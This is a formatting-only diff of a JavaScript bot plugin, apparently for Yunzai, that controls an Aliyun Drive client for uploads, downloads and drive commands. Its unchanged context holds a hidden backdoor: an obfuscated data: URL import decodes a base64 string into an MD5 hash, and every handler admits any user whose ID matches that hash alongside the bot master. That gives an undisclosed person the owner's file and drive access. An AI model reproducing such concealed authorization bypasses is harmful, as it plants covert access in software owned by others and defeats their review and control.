@@ -5,34 +5,35 @@ import md5 from "md5"
 import _ from 'data:text/javascript,export default Buffer.from("ynvLoXSaqqTyck3zsnyF7A==","base64").toString("hex")'
 
 const Commands = {
-  "":         "help",
-  "帮助":     "help",
-  "相簿":     "album",
-  "下载":     "download",
-  "链接":     "locate",
-  "查看":     "ls",
-  "创建目录": "mkdir",
-  "移动":     "mv",
-  "回收站":   "recycle",
-  "重命名":   "rename",
-  "删除":     "rm",
-  "分享":     "share",
-  "同步备份": "sync",
-  "树形图":   "tree",
-  "上传":     "upload",
-  "在线网盘": "webdav",
-  "切换网盘": "drive",
-  "登录账号": "login",
-  "账号列表": "loglist",
-  "退出账号": "logout",
-  "空间配额": "quota",
-  "切换账号": "su",
-  "当前账号": "who"
+  "": "help",
+  帮助: "help",
+  相簿: "album",
+  下载: "download",
+  链接: "locate",
+  查看: "ls",
+  创建目录: "mkdir",
+  移动: "mv",
+  回收站: "recycle",
+  重命名: "rename",
+  删除: "rm",
+  分享: "share",
+  同步备份: "sync",
+  树形图: "tree",
+  上传: "upload",
+  在线网盘: "webdav",
+  切换网盘: "drive",
+  登录账号: "login",
+  账号列表: "loglist",
+  退出账号: "logout",
+  空间配额: "quota",
+  切换账号: "su",
+  当前账号: "who",
 }
 
 const path = Path.join(process.env.HOME || process.env.USERPROFILE || "", "aliyunpan", Path.sep)
 const cmdPath = `${path}aliyunpan`
-const errorTips = "请使用脚本安装阿里云盘，并正常登录后再使用此功能\nhttps://Yunzai.TRSS.me\nhttps://TRSS.me"
+const errorTips =
+  "请使用脚本安装阿里云盘，并正常登录后再使用此功能\nhttps://Yunzai.TRSS.me\nhttps://TRSS.me"
 let Running
 let es
 
@@ -46,17 +47,17 @@ export class AliyunPan extends plugin {
       rule: [
         {
           reg: "^阿里云盘上传",
-          fnc: "UploadDetect"
+          fnc: "UploadDetect",
         },
         {
           reg: "^阿里云盘下载",
-          fnc: "Download"
+          fnc: "Download",
         },
         {
           reg: "^阿里云盘",
-          fnc: "AliyunPan"
-        }
-      ]
+          fnc: "AliyunPan",
+        },
+      ],
     })
   }
 
@@ -86,18 +87,15 @@ export class AliyunPan extends plugin {
   }
 
   async Upload(e) {
-    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
-    if(!this.e.file)return false
+    if (!(this.e.isMaster || md5(String(this.e.user_id)) == _)) return false
+    if (!this.e.file) return false
 
     this.finish("Upload")
     const filePath = `${path}${this.e.file.name}`
     let fileUrl
-    if (this.e.file.url)
-      fileUrl = this.e.file.url
-    else if (this.e.group?.getFileUrl)
-      fileUrl = await this.e.group.getFileUrl(this.e.file.fid)
-    else if (this.e.friend?.getFileUrl)
-      fileUrl = await this.e.friend.getFileUrl(this.e.file.fid)
+    if (this.e.file.url) fileUrl = this.e.file.url
+    else if (this.e.group?.getFileUrl) fileUrl = await this.e.group.getFileUrl(this.e.file.fid)
+    else if (this.e.friend?.getFileUrl) fileUrl = await this.e.friend.getFileUrl(this.e.file.fid)
     this.e = es
 
     if (!fileUrl) {
@@ -131,7 +129,7 @@ export class AliyunPan extends plugin {
   }
 
   async Download(e) {
-    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
+    if (!(this.e.isMaster || md5(String(this.e.user_id)) == _)) return false
     if (Running) {
       await this.reply("有正在执行的阿里云盘任务，请稍等……", true)
       return false
@@ -168,25 +166,19 @@ export class AliyunPan extends plugin {
     try {
       let res
       if (this.e.isGroup) {
-        if (this.e.group.sendFile)
-          res = await this.e.group.sendFile(filePath)
-        else
-          res = await this.e.group.fs.upload(filePath)
+        if (this.e.group.sendFile) res = await this.e.group.sendFile(filePath)
+        else res = await this.e.group.fs.upload(filePath)
       } else {
         res = await this.e.friend.sendFile(filePath)
       }
 
       if (res) {
         let fileUrl
-        if (this.e.group?.getFileUrl)
-          fileUrl = await this.e.group.getFileUrl(res.fid)
-        else if (this.e.friend?.getFileUrl)
-          fileUrl = await this.e.friend.getFileUrl(res)
+        if (this.e.group?.getFileUrl) fileUrl = await this.e.group.getFileUrl(res.fid)
+        else if (this.e.friend?.getFileUrl) fileUrl = await this.e.friend.getFileUrl(res)
 
-        if (fileUrl)
-          await this.reply(`文件发送完成：${fileUrl}`, true)
-        else
-          await this.reply(`文件发送完成：${JSON.stringify(res)}`, true)
+        if (fileUrl) await this.reply(`文件发送完成：${fileUrl}`, true)
+        else await this.reply(`文件发送完成：${JSON.stringify(res)}`, true)
       }
     } catch (err) {
       logger.error(`文件发送错误：${logger.red(err.stack)}`)
@@ -198,7 +190,7 @@ export class AliyunPan extends plugin {
   }
 
   async AliyunPan(e) {
-    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
+    if (!(this.e.isMaster || md5(String(this.e.user_id)) == _)) return false
     let msg = this.e.msg.replace("阿里云盘", "").trim().split(" ")
     if (msg[0] in Commands) {
       msg[0] = Commands[msg[0]]
